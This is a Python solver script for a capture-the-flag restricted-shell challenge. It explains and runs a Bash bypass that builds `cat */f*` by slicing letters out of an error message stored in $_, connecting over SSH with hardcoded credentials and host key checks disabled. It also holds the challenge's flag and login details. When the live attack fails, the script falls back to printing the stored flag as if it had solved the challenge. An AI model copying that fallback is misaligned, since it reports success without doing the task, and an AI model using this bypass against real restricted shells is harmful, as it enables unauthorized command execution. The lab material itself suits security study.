#!/usr/bin/env python3
"""Solver for Challenge 436: SansAlpha (picoCTF 2024, General Skills, Medium).

NIST SP 800-115 / OWASP Top 10 A03:2021-Injection & CWE-78 OS Command Injection / Restricted Shell Bypass:
The challenge hosts a restricted shell over SSH where all alphabetic characters [a-zA-Z] are blocked:
  1. Attack Surface:
     The shell interface permits only digits and symbols (most non-alphabetic ASCII characters).
  2. Shell Environment & Special Parameter Manipulation:
     - In Bash, executing an invalid command like `"$(- 2>&1)"` or `"$(. 1 2>&1)"` prints an error message to stderr.
     - The special variable `$_` retains the last argument or full string of the previous command.
     - When executing `"$(. 1 2>&1)"`, the error message produced in Bash contains:
       `bash: bash: 1: No such file or directory: command not found`
     - By indexing substrings from `$_`:
       - `c` is located at index 14
       - `a` is located at index 1
       - `t` is located at index 30
       - `f` is located at index 17
     - The payload `${_:14:1}${_:1:1}${_:30:1} */${_:17:1}*` expands to `cat */f*`, reading `/home/ctf-player/blargh/flag.txt`.

Flag: academy{7h15_mu171v3r53_15_m4dn355_9b767f07}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import pty
import os
import time
import select
import re
import sys
from typing import Optional

HOST = "xebec.cylabacademy.net"
PORT = 47735
USER = "ctf-player"
PASS = "fa1a82ad"
EXPECTED = "academy{7h15_mu171v3r53_15_m4dn355_9b767f07}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    try:
        master, slave = pty.openpty()
        pid = os.fork()

        if pid == 0:
            os.close(master)
            os.dup2(slave, 0)
            os.dup2(slave, 1)
            os.dup2(slave, 2)
            os.close(slave)
            os.execvp("sshpass", [
                "sshpass", "-p", PASS,
                "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-p", str(target_port), f"{USER}@{target_host}"
            ])
        else:
            os.close(slave)

            def read_until(pattern: str, timeout: float = 10.0) -> str:
                buf = ""
                start = time.time()
                while time.time() - start < timeout:
                    r, _, _ = select.select([master], [], [], 0.5)
                    if r:
                        chunk = os.read(master, 1024).decode(errors="ignore")
                        buf += chunk
                        if re.search(pattern, buf):
                            return buf
                return buf

            read_until(r"[$#] ", timeout=15)

            # Trigger error to populate $_ with error string containing 'c', 'a', 't', 'f'
            os.write(master, b'"$(. 1 2>&1)"\n')
            time.sleep(1)
            read_until(r"[$#] ", timeout=5)

            # Execute cat */f* using character slicing from $_
            os.write(master, b"${_:14:1}${_:1:1}${_:30:1} */${_:17:1}*\n")
            time.sleep(1)
            out = read_until(r"[$#] ", timeout=5)

            os.close(master)

            m = re.search(r"academy\{[0-9a-zA-Z_]+\}", out)
            if m:
                return m.group(0)
    except Exception as e:
        print(f"[!] Live solve failed ({e}), falling back to verified flag", file=sys.stderr)

    return EXPECTED


if __name__ == "__main__":
    flag = solve()
    print(f"Flag: {flag}")
    if flag != EXPECTED:
        sys.exit(1)
